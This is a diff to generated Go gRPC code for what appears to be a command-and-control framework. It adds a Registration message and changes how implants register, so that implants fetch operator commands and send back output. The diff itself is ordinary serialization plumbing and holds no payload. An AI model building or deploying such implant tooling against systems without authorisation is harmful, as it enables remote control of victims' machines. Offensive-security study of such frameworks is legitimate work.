@@ -45,7 +45,7 @@ type Command struct {
 	// these act as offsets, we are basically saying that the "in" message will come first, and the "out" message will come second. These offsets are also arbitrary.
 	In            string `protobuf:"bytes,1,opt,name=In,proto3" json:"In,omitempty"`
 	Out           string `protobuf:"bytes,2,opt,name=Out,proto3" json:"Out,omitempty"`
-	Uuid          string `protobuf:"bytes,3,opt,name=uuid,proto3" json:"uuid,omitempty"` //we could probably just generate this at compile time.
+	Uuid          string `protobuf:"bytes,3,opt,name=Uuid,proto3" json:"Uuid,omitempty"` //we could probably just generate this at compile time.
 	unknownFields protoimpl.UnknownFields
 	sizeCache     protoimpl.SizeCache
 }
@@ -101,6 +101,52 @@ func (x *Command) GetUuid() string {
 	return ""
 }
 
+// added this to deal with registering a new implant
+type Registration struct {
+	state protoimpl.MessageState `protogen:"open.v1"`
+	// houses the compile-time uuid
+	Uuid          string `protobuf:"bytes,1,opt,name=Uuid,proto3" json:"Uuid,omitempty"`
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *Registration) Reset() {
+	*x = Registration{}
+	mi := &file_implant_proto_msgTypes[1]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *Registration) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*Registration) ProtoMessage() {}
+
+func (x *Registration) ProtoReflect() protoreflect.Message {
+	mi := &file_implant_proto_msgTypes[1]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use Registration.ProtoReflect.Descriptor instead.
+func (*Registration) Descriptor() ([]byte, []int) {
+	return file_implant_proto_rawDescGZIP(), []int{1}
+}
+
+func (x *Registration) GetUuid() string {
+	if x != nil {
+		return x.Uuid
+	}
+	return ""
+}
+
 // Empty message is used in place of NULL for this API/.
 type Empty struct {
 	state         protoimpl.MessageState `protogen:"open.v1"`
@@ -110,7 +156,7 @@ type Empty struct {
 
 func (x *Empty) Reset() {
 	*x = Empty{}
-	mi := &file_implant_proto_msgTypes[1]
+	mi := &file_implant_proto_msgTypes[2]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -122,7 +168,7 @@ func (x *Empty) String() string {
 func (*Empty) ProtoMessage() {}
 
 func (x *Empty) ProtoReflect() protoreflect.Message {
-	mi := &file_implant_proto_msgTypes[1]
+	mi := &file_implant_proto_msgTypes[2]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -135,7 +181,7 @@ func (x *Empty) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use Empty.ProtoReflect.Descriptor instead.
 func (*Empty) Descriptor() ([]byte, []int) {
-	return file_implant_proto_rawDescGZIP(), []int{1}
+	return file_implant_proto_rawDescGZIP(), []int{2}
 }
 
 var File_implant_proto protoreflect.FileDescriptor
@@ -145,28 +191,27 @@ var file_implant_proto_rawDesc = []byte{
 	0x07, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x22, 0x3f, 0x0a, 0x07, 0x43, 0x6f, 0x6d, 0x6d,
 	0x61, 0x6e, 0x64, 0x12, 0x0e, 0x0a, 0x02, 0x49, 0x6e, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52,
 	0x02, 0x49, 0x6e, 0x12, 0x10, 0x0a, 0x03, 0x4f, 0x75, 0x74, 0x18, 0x02, 0x20, 0x01, 0x28, 0x09,
-	0x52, 0x03, 0x4f, 0x75, 0x74, 0x12, 0x12, 0x0a, 0x04, 0x75, 0x75, 0x69, 0x64, 0x18, 0x03, 0x20,
-	0x01, 0x28, 0x09, 0x52, 0x04, 0x75, 0x75, 0x69, 0x64, 0x22, 0x07, 0x0a, 0x05, 0x45, 0x6d, 0x70,
-	0x74, 0x79, 0x32, 0xa3, 0x01, 0x0a, 0x07, 0x49, 0x6d, 0x70, 0x6c, 0x61, 0x6e, 0x74, 0x12, 0x30,
-	0x0a, 0x0c, 0x46, 0x65, 0x74, 0x63, 0x68, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x12, 0x0e,
-	0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x45, 0x6d, 0x70, 0x74, 0x79, 0x1a, 0x10,
-	0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64,
-	0x12, 0x2e, 0x0a, 0x0a, 0x53, 0x65, 0x6e, 0x64, 0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x12, 0x10,
-	0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64,
-	0x1a, 0x0e, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x45, 0x6d, 0x70, 0x74, 0x79,
-	0x12, 0x36, 0x0a, 0x12, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x4e, 0x65, 0x77, 0x49,
-	0x6d, 0x70, 0x6c, 0x61, 0x6e, 0x74, 0x12, 0x0e, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69,
-	0x2e, 0x45, 0x6d, 0x70, 0x74, 0x79, 0x1a, 0x10, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69,
-	0x2e, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x32, 0x75, 0x0a, 0x05, 0x41, 0x64, 0x6d, 0x69,
-	0x6e, 0x12, 0x30, 0x0a, 0x0a, 0x52, 0x75, 0x6e, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x12,
-	0x10, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e,
-	0x64, 0x1a, 0x10, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x43, 0x6f, 0x6d, 0x6d,
-	0x61, 0x6e, 0x64, 0x12, 0x3a, 0x0a, 0x16, 0x4c, 0x69, 0x73, 0x74, 0x52, 0x65, 0x67, 0x69, 0x73,
-	0x74, 0x65, 0x72, 0x65, 0x64, 0x49, 0x6d, 0x70, 0x6c, 0x61, 0x6e, 0x74, 0x73, 0x12, 0x0e, 0x2e,
-	0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x45, 0x6d, 0x70, 0x74, 0x79, 0x1a, 0x10, 0x2e,
-	0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x42,
-	0x0e, 0x5a, 0x0c, 0x67, 0x6f, 0x72, 0x65, 0x2f, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x62,
-	0x06, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x33,
+	0x52, 0x03, 0x4f, 0x75, 0x74, 0x12, 0x12, 0x0a, 0x04, 0x55, 0x75, 0x69, 0x64, 0x18, 0x03, 0x20,
+	0x01, 0x28, 0x09, 0x52, 0x04, 0x55, 0x75, 0x69, 0x64, 0x22, 0x22, 0x0a, 0x0c, 0x52, 0x65, 0x67,
+	0x69, 0x73, 0x74, 0x72, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x12, 0x12, 0x0a, 0x04, 0x55, 0x75, 0x69,
+	0x64, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x55, 0x75, 0x69, 0x64, 0x22, 0x07, 0x0a,
+	0x05, 0x45, 0x6d, 0x70, 0x74, 0x79, 0x32, 0xa8, 0x01, 0x0a, 0x07, 0x49, 0x6d, 0x70, 0x6c, 0x61,
+	0x6e, 0x74, 0x12, 0x30, 0x0a, 0x0c, 0x46, 0x65, 0x74, 0x63, 0x68, 0x43, 0x6f, 0x6d, 0x6d, 0x61,
+	0x6e, 0x64, 0x12, 0x0e, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x45, 0x6d, 0x70,
+	0x74, 0x79, 0x1a, 0x10, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x43, 0x6f, 0x6d,
+	0x6d, 0x61, 0x6e, 0x64, 0x12, 0x2e, 0x0a, 0x0a, 0x53, 0x65, 0x6e, 0x64, 0x4f, 0x75, 0x74, 0x70,
+	0x75, 0x74, 0x12, 0x10, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x43, 0x6f, 0x6d,
+	0x6d, 0x61, 0x6e, 0x64, 0x1a, 0x0e, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x45,
+	0x6d, 0x70, 0x74, 0x79, 0x12, 0x3b, 0x0a, 0x12, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72,
+	0x4e, 0x65, 0x77, 0x49, 0x6d, 0x70, 0x6c, 0x61, 0x6e, 0x74, 0x12, 0x15, 0x2e, 0x67, 0x72, 0x70,
+	0x63, 0x61, 0x70, 0x69, 0x2e, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x72, 0x61, 0x74, 0x69, 0x6f,
+	0x6e, 0x1a, 0x0e, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x2e, 0x45, 0x6d, 0x70, 0x74,
+	0x79, 0x32, 0x39, 0x0a, 0x05, 0x41, 0x64, 0x6d, 0x69, 0x6e, 0x12, 0x30, 0x0a, 0x0a, 0x52, 0x75,
+	0x6e, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x12, 0x10, 0x2e, 0x67, 0x72, 0x70, 0x63, 0x61,
+	0x70, 0x69, 0x2e, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x1a, 0x10, 0x2e, 0x67, 0x72, 0x70,
+	0x63, 0x61, 0x70, 0x69, 0x2e, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x42, 0x0e, 0x5a, 0x0c,
+	0x67, 0x6f, 0x72, 0x65, 0x2f, 0x67, 0x72, 0x70, 0x63, 0x61, 0x70, 0x69, 0x62, 0x06, 0x70, 0x72,
+	0x6f, 0x74, 0x6f, 0x33,
 }
 
 var (
@@ -181,24 +226,23 @@ func file_implant_proto_rawDescGZIP() []byte {
 	return file_implant_proto_rawDescData
 }
 
-var file_implant_proto_msgTypes = make([]protoimpl.MessageInfo, 2)
+var file_implant_proto_msgTypes = make([]protoimpl.MessageInfo, 3)
 var file_implant_proto_goTypes = []any{
-	(*Command)(nil), // 0: grpcapi.Command
-	(*Empty)(nil),   // 1: grpcapi.Empty
+	(*Command)(nil),      // 0: grpcapi.Command
+	(*Registration)(nil), // 1: grpcapi.Registration
+	(*Empty)(nil),        // 2: grpcapi.Empty
 }
 var file_implant_proto_depIdxs = []int32{
-	1, // 0: grpcapi.Implant.FetchCommand:input_type -> grpcapi.Empty
+	2, // 0: grpcapi.Implant.FetchCommand:input_type -> grpcapi.Empty
 	0, // 1: grpcapi.Implant.SendOutput:input_type -> grpcapi.Command
-	1, // 2: grpcapi.Implant.RegisterNewImplant:input_type -> grpcapi.Empty
+	1, // 2: grpcapi.Implant.RegisterNewImplant:input_type -> grpcapi.Registration
 	0, // 3: grpcapi.Admin.RunCommand:input_type -> grpcapi.Command
-	1, // 4: grpcapi.Admin.ListRegisteredImplants:input_type -> grpcapi.Empty
-	0, // 5: grpcapi.Implant.FetchCommand:output_type -> grpcapi.Command
-	1, // 6: grpcapi.Implant.SendOutput:output_type -> grpcapi.Empty
-	0, // 7: grpcapi.Implant.RegisterNewImplant:output_type -> grpcapi.Command
-	0, // 8: grpcapi.Admin.RunCommand:output_type -> grpcapi.Command
-	0, // 9: grpcapi.Admin.ListRegisteredImplants:output_type -> grpcapi.Command
-	5, // [5:10] is the sub-list for method output_type
-	0, // [0:5] is the sub-list for method input_type
+	0, // 4: grpcapi.Implant.FetchCommand:output_type -> grpcapi.Command
+	2, // 5: grpcapi.Implant.SendOutput:output_type -> grpcapi.Empty
+	2, // 6: grpcapi.Implant.RegisterNewImplant:output_type -> grpcapi.Empty
+	0, // 7: grpcapi.Admin.RunCommand:output_type -> grpcapi.Command
+	4, // [4:8] is the sub-list for method output_type
+	0, // [0:4] is the sub-list for method input_type
 	0, // [0:0] is the sub-list for extension type_name
 	0, // [0:0] is the sub-list for extension extendee
 	0, // [0:0] is the sub-list for field type_name
@@ -215,7 +259,7 @@ func file_implant_proto_init() {
 			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
 			RawDescriptor: file_implant_proto_rawDesc,
 			NumEnums:      0,
-			NumMessages:   2,
+			NumMessages:   3,
 			NumExtensions: 0,
 			NumServices:   2,
 		},
@@ -243,7 +287,7 @@ const _ = grpc.SupportPackageIsVersion6
 type ImplantClient interface {
 	FetchCommand(ctx context.Context, in *Empty, opts ...grpc.CallOption) (*Command, error)
 	SendOutput(ctx context.Context, in *Command, opts ...grpc.CallOption) (*Empty, error)
-	RegisterNewImplant(ctx context.Context, in *Empty, opts ...grpc.CallOption) (*Command, error)
+	RegisterNewImplant(ctx context.Context, in *Registration, opts ...grpc.CallOption) (*Empty, error)
 }
 
 type implantClient struct {
@@ -272,8 +316,8 @@ func (c *implantClient) SendOutput(ctx context.Context, in *Command, opts ...grp
 	return out, nil
 }
 
-func (c *implantClient) RegisterNewImplant(ctx context.Context, in *Empty, opts ...grpc.CallOption) (*Command, error) {
-	out := new(Command)
+func (c *implantClient) RegisterNewImplant(ctx context.Context, in *Registration, opts ...grpc.CallOption) (*Empty, error) {
+	out := new(Empty)
 	err := c.cc.Invoke(ctx, "/grpcapi.Implant/RegisterNewImplant", in, out, opts...)
 	if err != nil {
 		return nil, err
@@ -285,7 +329,7 @@ func (c *implantClient) RegisterNewImplant(ctx context.Context, in *Empty, opts 
 type ImplantServer interface {
 	FetchCommand(context.Context, *Empty) (*Command, error)
 	SendOutput(context.Context, *Command) (*Empty, error)
-	RegisterNewImplant(context.Context, *Empty) (*Command, error)
+	RegisterNewImplant(context.Context, *Registration) (*Empty, error)
 }
 
 // UnimplementedImplantServer can be embedded to have forward compatible implementations.
@@ -298,7 +342,7 @@ func (*UnimplementedImplantServer) FetchCommand(context.Context, *Empty) (*Comma
 func (*UnimplementedImplantServer) SendOutput(context.Context, *Command) (*Empty, error) {
 	return nil, status.Errorf(codes.Unimplemented, "method SendOutput not implemented")
 }
-func (*UnimplementedImplantServer) RegisterNewImplant(context.Context, *Empty) (*Command, error) {
+func (*UnimplementedImplantServer) RegisterNewImplant(context.Context, *Registration) (*Empty, error) {
 	return nil, status.Errorf(codes.Unimplemented, "method RegisterNewImplant not implemented")
 }
 
@@ -343,7 +387,7 @@ func _Implant_SendOutput_Handler(srv interface{}, ctx context.Context, dec func(
 }
 
 func _Implant_RegisterNewImplant_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
-	in := new(Empty)
+	in := new(Registration)
 	if err := dec(in); err != nil {
 		return nil, err
 	}
@@ -355,7 +399,7 @@ func _Implant_RegisterNewImplant_Handler(srv interface{}, ctx context.Context, d
 		FullMethod: "/grpcapi.Implant/RegisterNewImplant",
 	}
 	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
-		return srv.(ImplantServer).RegisterNewImplant(ctx, req.(*Empty))
+		return srv.(ImplantServer).RegisterNewImplant(ctx, req.(*Registration))
 	}
 	return interceptor(ctx, in, info, handler)
 }
@@ -386,7 +430,6 @@ var _Implant_serviceDesc = grpc.ServiceDesc{
 // For semantics around ctx use and closing/ending streaming RPCs, please refer to https://godoc.org/google.golang.org/grpc#ClientConn.NewStream.
 type AdminClient interface {
 	RunCommand(ctx context.Context, in *Command, opts ...grpc.CallOption) (*Command, error)
-	ListRegisteredImplants(ctx context.Context, in *Empty, opts ...grpc.CallOption) (*Command, error)
 }
 
 type adminClient struct {
@@ -406,19 +449,9 @@ func (c *adminClient) RunCommand(ctx context.Context, in *Command, opts ...grpc.
 	return out, nil
 }
 
-func (c *adminClient) ListRegisteredImplants(ctx context.Context, in *Empty, opts ...grpc.CallOption) (*Command, error) {
-	out := new(Command)
-	err := c.cc.Invoke(ctx, "/grpcapi.Admin/ListRegisteredImplants", in, out, opts...)
-	if err != nil {
-		return nil, err
-	}
-	return out, nil
-}
-
 // AdminServer is the server API for Admin service.
 type AdminServer interface {
 	RunCommand(context.Context, *Command) (*Command, error)
-	ListRegisteredImplants(context.Context, *Empty) (*Command, error)
 }
 
 // UnimplementedAdminServer can be embedded to have forward compatible implementations.
@@ -427,9 +460,6 @@ type UnimplementedAdminServer struct {
 
 func (*UnimplementedAdminServer) RunCommand(context.Context, *Command) (*Command, error) {
 	return nil, status.Errorf(codes.Unimplemented, "method RunCommand not implemented")
-}
-func (*UnimplementedAdminServer) ListRegisteredImplants(context.Context, *Empty) (*Command, error) {
-	return nil, status.Errorf(codes.Unimplemented, "method ListRegisteredImplants not implemented")
 }
 
 func RegisterAdminServer(s *grpc.Server, srv AdminServer) {
@@ -454,24 +484,6 @@ func _Admin_RunCommand_Handler(srv interface{}, ctx context.Context, dec func(in
 	return interceptor(ctx, in, info, handler)
 }
 
-func _Admin_ListRegisteredImplants_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
-	in := new(Empty)
-	if err := dec(in); err != nil {
-		return nil, err
-	}
-	if interceptor == nil {
-		return srv.(AdminServer).ListRegisteredImplants(ctx, in)
-	}
-	info := &grpc.UnaryServerInfo{
-		Server:     srv,
-		FullMethod: "/grpcapi.Admin/ListRegisteredImplants",
-	}
-	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
-		return srv.(AdminServer).ListRegisteredImplants(ctx, req.(*Empty))
-	}
-	return interceptor(ctx, in, info, handler)
-}
-
 var _Admin_serviceDesc = grpc.ServiceDesc{
 	ServiceName: "grpcapi.Admin",
 	HandlerType: (*AdminServer)(nil),
@@ -479,10 +491,6 @@ var _Admin_serviceDesc = grpc.ServiceDesc{
 		{
 			MethodName: "RunCommand",
 			Handler:    _Admin_RunCommand_Handler,
-		},
-		{
-			MethodName: "ListRegisteredImplants",
-			Handler:    _Admin_ListRegisteredImplants_Handler,
 		},
 	},
 	Streams:  []grpc.StreamDesc{},
